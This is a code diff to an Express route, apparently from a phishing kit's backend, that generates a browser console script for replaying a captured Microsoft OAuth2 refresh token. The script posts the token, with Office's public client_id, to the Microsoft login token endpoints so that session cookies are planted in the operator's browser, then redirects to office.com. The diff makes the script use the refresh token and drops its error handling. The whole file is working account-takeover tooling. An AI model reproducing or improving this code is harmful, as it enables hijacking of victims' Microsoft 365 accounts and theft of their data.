@@ -483,15 +483,20 @@ router.get('/inject-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available for injection' });
     }
 
-    // Use the REAL refresh token (not PRT blob)
-    const tokenToUse = refreshToken || accessToken;
+    // Use the REAL OAuth2 refresh token (not PRT blob)
+    // refresh_token field contains the real OAuth2 token (starts with 0.AT or M.R)
+    const realRefreshToken = refreshToken;
+    
+    if (!realRefreshToken) {
+      return res.status(400).json({ error: 'No refresh token available. Cannot generate injection script.' });
+    }
     
     // Get client_id from config (same one used in device code flow)
     const clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 
-    // Generate the one-shot console script
+    // Generate the one-shot console script with relative URLs for same-origin cookie storage
     const script = `(async function() {
-  const refreshToken = "${tokenToUse}";
+  const refreshToken = "${realRefreshToken}";
   const clientId = "${clientId}";
 
   const body = new URLSearchParams({
@@ -502,36 +507,26 @@ router.get('/inject-script', userAuth, async (req, res) => {
   });
 
   const endpoints = [
-    { url: "/common/oauth2/v2.0/token", type: "work" },
-    { url: "/consumers/oauth2/v2.0/token", type: "personal" }
+    "/common/oauth2/v2.0/token",
+    "/consumers/oauth2/v2.0/token"
   ];
 
-  for (const ep of endpoints) {
+  for (const url of endpoints) {
     try {
-      const resp = await fetch(ep.url, {
+      const resp = await fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: body.toString(),
         credentials: "include"
       });
       if (resp.ok) {
-        // Fresh cookies are now set. Redirect to Office.
+        // Fresh cookies (ESTSAUTHPERSISTENT, esctx) are now set in the browser.
         window.location.href = "https://www.office.com/";
         return;
-      } else if (resp.status === 400) {
-        const errText = await resp.text();
-        if (errText.includes("invalid_grant") && ep.type === "work") continue;
-        console.error("Exchange failed:", errText);
-        alert("Token exchange failed. The refresh token may be expired.");
-        return;
       }
-    } catch (e) {
-      console.error("Network error:", e);
-      alert("Network error during exchange.");
-      return;
-    }
+    } catch (e) {}
   }
-  alert("Token exchange failed for all account types.");
+  alert("Exchange failed. The refresh token may be expired or the client_id is wrong.");
 })();`;
 
     res.type('application/javascript').send(script);
